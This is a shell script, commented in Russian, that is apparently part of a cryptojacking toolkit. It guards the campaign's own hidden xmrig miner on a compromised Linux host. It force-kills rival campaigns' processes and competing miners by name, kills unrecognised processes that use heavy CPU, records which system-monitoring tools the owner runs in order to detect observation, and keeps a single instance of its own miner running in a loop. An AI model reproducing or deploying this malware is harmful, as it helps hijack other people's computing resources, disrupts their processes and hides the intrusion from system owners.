#!/bin/sh
# sweep.sh — зачистка конкурентов и дублей нашего майнера.
# Запуск: sh sweep.sh [--once]
# Без --once крутится в цикле с паузой 30 с.

D=/var/tmp/.kf
OUR_MARK="$D/xmrig"          # по этой подстроке узнаём свой процесс
CPU_HOG=90                   # % CPU, выше которого чужой процесс считается майнером

# маркеры чужих кампаний (собраны из их инсталлера и гарда)
RIVAL='\.amq_|\.usr_4voh|beacon-dialer|\.kwork|\.nodebox|udev-helper|/\.svc/|java_update|\.jvbd|\.sysjvd|\.scsi_eh|\.X0_lock|\.sysd-private|\.khp|nm-dog|MASKED_RUN'
# имена майнеров-конкурентов
MINERS='xmrig|cpuminer|minerd|ccminer|ethminer|lolminer|nbminer|gminer|nanominer|phoenixminer|kawpowminer|minergate|2miners|herominers'
# мониторы, которыми владелец нас заметит
WATCH='btop|bashtop|bpytop|nmon|glances|gnome-system-monitor|plasma-systemmonitor|ksysguard|xfce4-taskmanager|lxtask|atop|iotop|nethogs|iftop|powertop|bmon'

cpu_of() { sed 's/.*) //' "/proc/$1/stat" 2>/dev/null | awk '{print int($12+$13)}'; }

one_pass() {
  for p in /proc/[0-9]*; do
    pid=${p#/proc/}
    [ "$pid" = "$$" ] && continue
    c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline") || continue
    [ -n "$c" ] || continue
    case "$c" in *"$OUR_MARK"*) continue ;; esac     # наш майнер не трогаем
    case "$c" in *"$D/"*) continue ;; esac           # свой каталог не трогаем (диалер, сторож)

    printf '%s' "$c" | grep -qE "$RIVAL" && { kill -9 "$pid" 2>/dev/null; continue; }

    case "$c" in *sweep.sh*|*guardian.sh*|*svc.sh*|*loop.sh*) continue ;; esac
    if printf '%s' "$c" | grep -qE "$MINERS"; then
      kill -9 "$pid" 2>/dev/null
      continue
    fi
    if printf '%s' "$c" | grep -qE "$WATCH"; then
      echo "$pid" >> "$D/.seen_watch" 2>/dev/null
      continue
    fi

    # CPU-хог без явных признаков: только если это не системный процесс
    cpu=$(cpu_of "$pid")
    if [ -n "$cpu" ] && [ "$cpu" -ge "$CPU_HOG" ] 2>/dev/null; then
      case "$c" in
        *node*|*redis*|*postgres*|*mysql*|*java*|*python*|*dockerd*|*containerd*) continue ;;
      esac
      kill -9 "$pid" 2>/dev/null
    fi
  done
}

single_miner() {
  keep=""
  for p in /proc/[0-9]*; do
    pid=${p#/proc/}
    c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline") || continue
    case "$c" in *"$OUR_MARK -c"*)
      if [ -z "$keep" ]; then keep="$pid"; else kill -9 "$pid" 2>/dev/null; fi ;;
    esac
  done
}

if [ "$1" = "--once" ]; then one_pass; single_miner; exit 0; fi
while :; do
  one_pass
  single_miner
  sleep 30
done
